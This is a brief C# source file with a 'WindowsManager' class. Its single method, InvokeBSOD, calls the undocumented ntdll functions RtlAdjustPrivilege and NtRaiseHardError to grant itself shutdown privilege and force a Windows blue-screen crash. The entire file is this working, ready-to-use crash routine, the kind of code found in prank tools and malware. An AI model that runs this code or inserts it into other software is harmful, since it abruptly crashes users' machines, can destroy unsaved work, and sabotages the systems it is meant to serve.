﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Tools
{
    public class WindowsManager
    {
        [DllImport("ntdll.dll")]
        private static extern void RtlAdjustPrivilege(uint x, bool y,bool z, out bool a);
        [DllImport("ntdll.dll")]
        private static extern void NtRaiseHardError(ulong x, ulong y, ulong z, ulong c, ulong a, out ulong b);
        public static void InvokeBSOD()
        {
            Boolean bl;
            RtlAdjustPrivilege(19, true, false, out bl);
            ulong res;
            NtRaiseHardError(0xC0000420L, 0, 0, 0, 6, out res);
        }
    }
}
